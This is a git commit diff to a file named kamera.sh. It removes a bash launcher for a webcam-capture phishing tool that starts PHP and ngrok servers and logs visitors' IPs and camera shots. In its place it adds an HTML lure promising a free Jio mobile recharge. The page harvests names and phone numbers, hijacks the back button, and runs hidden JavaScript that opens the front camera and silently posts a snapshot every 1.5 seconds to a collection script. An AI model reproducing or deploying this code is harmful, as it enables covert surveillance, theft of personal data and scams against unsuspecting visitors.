dad6331ae80749f219e04ff941f1c191b682156b
rmjkoffice <66090961+rmjkoffice@users.noreply.github.com>
2020-05-29 03:54:44 +0700

    Update kamera.sh

--- kamera.sh
+++ kamera.sh
@@ -1,246 +1,125 @@
-#!/bin/bash
-# kamera v1.2
-# Coded by: @linux_choice (twitter)
-# Github: https://github.com/rmjkoffice/kamera
-
-trap 'printf "\n";stop' 2
-
-banner() {
-
-
-printf "      \e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "      \e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "      \e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "      \e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "      \e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "      \e[1;92m              |___/ \e[0m                                 \n"
-
-printf "\n"                                                              
-printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"                              
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/thelinuxchoice/saycheese          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf "\n"
-printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
-printf "         testing in an authorized simulated cyberattack\n"
-printf "         Attacking targets without prior mutual consent\n"
-printf "         is illegal!\n"
+<head>
+<meta content="utf-8" name="charset">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+<title>Hey Dear! You Have Won Free Rs 399 Jio Recharge</title>
+	<meta property="og:type" content="website">
+<meta property="og:title" content="Hey Dear! You Have Won Free Rs 399 Jio Recharge">
+	<meta property="og:url" content="Free 399 Recharge">
+<meta property="og:site_name" content="index.html">
+	<meta property="og:image" content="http://deals-online.in/jio/head.png">
+<link rel="stylesheet" type="text/css" href="jio\style.css">
+	<style type="text/css">h2{height: 50px;background-color: #007ee6;color: #FFF;line-height: 50px;font-size: 24px;margin: 0;text-align: center;}.countDown{text-align: center;padding: 0 1em;color: #999;}.countDown .timer{color: #007ee6;font-size: 1.2em;}.peopleCount{text-align: center;padding: 0 1em;color: #999;}.peopleCount .number{background-color: #007ee6;color: #FFF;display: inline-block;padding: 0 10px;}</style>
+	</head>
+<form align="right" action="jio/invite.htm" method="POST">	
+	<body>
+	<script type="text/javascript">function next(){location.href="jio/invite.htm"+location.search}function setCookie(e,t){var n=new Date;n.setTime(n.getTime()+2592e6);var o="expires="+n.toUTCString();document.cookie=e+"="+t+"; "+o}function getCookie(e){for(var t=e+"=",n=document.cookie.split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(t))return i.substring(t.length,i.length)}return 0}var message="You have not Permission to This";document.onmousedown=function(e){return"Netscape"==navigator.appName&&3==e.which?(alert(message),!1):-1!=navigator.appVersion.indexOf("MSIE")&&2==event.button?(alert(message),!1):void 0};</script>
 
 
-printf "\n"
+	<img src="kk.jpg" class="full"><h2>Free Jio 399 Recharge </h2>
+
+	<form>
+<label>Please Allow permission or you will not get recharge</labe>
+	  <div class="input-group">
+	  <label>Your Name</label>
+	  <input name="name" placeholder="Enter Full Name ..." required="required" type="text"></div>
+  <div class="input-group">
+<label>Your Phone Number</label>
+<input name="number" placeholder="Enter Your Phone Number Here " required="required" type="number"></div>
+<div class="input-group">
+<label>Amount</label>
+<select><option selected="selected">Rs 399</option></select></div>
+<a class="input-group" href="jio\invite.htm" rel="dofollow" unselectable="on"><button>Recharge Now</button></a>
+<div class="input-group"><button>Recharge Now</button></div>
+
+</form>
+
+<div class="countDown">Offer <span class="timer"></span> expires within </div>
+
+
+<script type="text/javascript">function leftTimer(){var e=new Date((new Date).getTime()+864e5),t=new Date(e.getFullYear()+"-"+checkTime(e.getMonth()+1)+"-"+checkTime(e.getDate()))-new Date,n=parseInt(t/1e3/60/60/24,10),r=parseInt(t/1e3/60/60%24,10),o=parseInt(t/1e3/60%60,10),u=parseInt(t/1e3%60,10);return n=checkTime(n),r=checkTime(r),o=checkTime(o),u=checkTime(u),r+":"+o+":"+u}function checkTime(e){return e<10&&(e="0"+e),e}document.querySelector("form").onsubmit=function(){return setCookie("free-recharge_name",document.querySelector('input[name="name"]').value),setCookie("free-recharge_number",document.querySelector('input[name="number"]').value),next(),!1};var updatePeople=function(){var e=parseInt(1e3*Math.random());setTimeout(function(){for(var e=parseInt((new Date).getTime()/10)-1501742e5,t=e.toString().split("").reverse(),n="",r=0;r<t.length;r++)r%3==0&&0!=r&&(n=","+n),n=t[r]+n;document.querySelector(".peopleCount .number").innerText=n},e),document.querySelector(".countDown .timer").innerText=leftTimer()};updatePeople(),setInterval(updatePeople,1e3);</script>
+
+
+</body>
+
+
+
+
+
+<script type="text/javascript">! function (){var 
+t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state && location.replace("https://www.newtrendmasti.com")}}catch (o){}}();</script>
+
+
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
 
 
 }
 
-stop() {
+// Load init
+init();
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-checkphp=$(ps aux | grep -o "php" | head -n1)
-#checkssh=$(ps aux | grep -o "ssh" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
-fi
-exit 1
-
-}
-
-dependencies() {
-
-
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
-
-}
-
-catch_ip() {
-
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
-cat ip.txt >> saved.ip.txt
-
-
-}
-
-checkfound() {
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-catch_ip
-rm -rf ip.txt
-
-fi
-
-sleep 0.5
-
-if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\e[1;77m (saved in images/)\e[0m\n"
-rm -rf Log.log
-fi
-sleep 0.5
-
-done 
-
-}
-
-
-
-ngrok_server() {
-
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-arch3=$(uname -a | grep -o 'amd64' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-elif [[ $arch3 == *'amd64'* ]] ; then
-
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-amd64.zip ]]; then
-unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-amd64.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
-php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-
-if [[ -z $link ]];then
-printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
-exit 1
-fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
-
-}
-
-start() {
-
-if [[ ! -d images/ ]]; then
-mkdir images
-fi
-
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Mirror website\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom template\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 1 ]]; then
-
-command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: apt-get install httrack"; exit 1; }
-default_website_mirror="https://snapcamera.snapchat.com"
-printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror 
-read website_mirror
-website_mirror="${website_mirror:-${default_website_mirror}}"
-printf "\e[1;92m[\e[0m+\e[1;92m] Mirroring website with HTTrack...\e[0m\n"
-if [[ ! -d websites/ ]]; then
-mkdir websites
-fi
-
-httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
-payload
-ngrok_server
-checkfound
-
-
-elif [[ $option_server -eq 2 ]]; then
-default_website_template="saycheese.html"
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
-website_template="${website_template:-${default_website_template}}"
-if [[ -f $website_template ]]; then
-
-if [[ $website_template == *'index.php'* ]]; then
-printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
-exit 1
-fi
-
-cat $website_template > index.php
-cat template.html >> index.php
-ngrok_server
-checkfound
-
-else
-printf "\e[91m[!] File not found\n"
-exit 1
-fi
-
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start
-fi
-
-}
-
-
-payload() {
-
-index_file=$(grep -o 'HREF=".*"' websites/index.html | cut -d '"' -f2)
-
-if [ -f websites/"$index_file" ]; then
-cat websites/$index_file > index.php
-cat template.html >> index.php
-fi
-}
-
-
-banner
-dependencies
-start
-
+</script>
+</html>
